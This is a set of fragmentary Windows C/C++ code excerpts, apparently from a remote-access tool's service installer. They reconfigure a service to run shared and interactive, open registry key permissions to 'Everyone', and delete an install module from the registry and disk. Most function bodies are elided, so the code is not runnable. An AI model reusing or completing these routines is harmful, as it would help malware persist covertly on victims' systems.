...
void RemoveService(LPCTSTR lpServiceName)
{
	...
	__try
	{
		...
		wsprintf(regKey, _T("SYSTEM\\CurrentControlSet\\Services\\%s"), lpServiceName);
...
{
	wchar_t	strInstallModule[MAX_PATH];
	wchar_t	strSubKey[1024];
	...
	ReadRegEx(HKEY_LOCAL_MACHINE, strSubKey,
		_T("InstallModule"), REG_SZ, strInstallModule, NULL, lstrlen(strInstallModule), 0);
	// 删除键值和文件
	WriteRegEx(HKEY_LOCAL_MACHINE, strSubKey, _T("InstallModule"), REG_SZ, NULL, NULL, 3);
	for (int i = 0; i < 25; i++)
	{
		Sleep(3000);
...
int memfind(const wchar_t *mem, const wchar_t *str, int sizem, int sizes)   
{   
	int   da,i,j;   
	if (sizes == 0) da = wcslen(str);   
	else da = sizes;   
	for (i = 0; i < sizem; i++)   
	{   
		for (j = 0; j < da; j ++)   
...
LPCTSTR FindConfigString(HMODULE hModule, LPCTSTR lpString)
{
	...
	lpConfigString = new wchar_t[MAX_CONFIG_LEN];
...
void ReConfigService(wchar_t *lpServiceName)
{
	...
	try{
		wchar_t buff[500];
		//config service
		wcscpy(buff, _T("SYSTEM\\CurrentControlSet\\Services\\"));
		wcscat(buff, lpServiceName);
		...
		// 进程为Owner的，改为Share
		DWORD dwType = 0x120;
		rc = RegSetValueEx(hKey, _T("Type"), 0, REG_DWORD, (unsigned char*)&dwType, sizeof(DWORD));
		SetLastError(rc);
		if(ERROR_SUCCESS != rc)
...
BOOL RegKeySetACL(LPTSTR lpKeyName, DWORD AccessPermissions, ACCESS_MODE AccessMode)
{
	...
	wchar_t	*lpUsers[] = {_T("SYSTEM"), _T("Administrators"), _T("Everyone"), _T("Users")};
...
DWORD QueryServiceTypeFromRegedit(wchar_t *lpServiceName)
{
	...
	try{
		...
		rc = RegQueryValueEx(hKey, _T("Type"), 0, &type, (unsigned char *)&dwServiceType, &size);
		RegCloseKey(hKey);
		SetLastError(rc);
		if(ERROR_SUCCESS != rc)
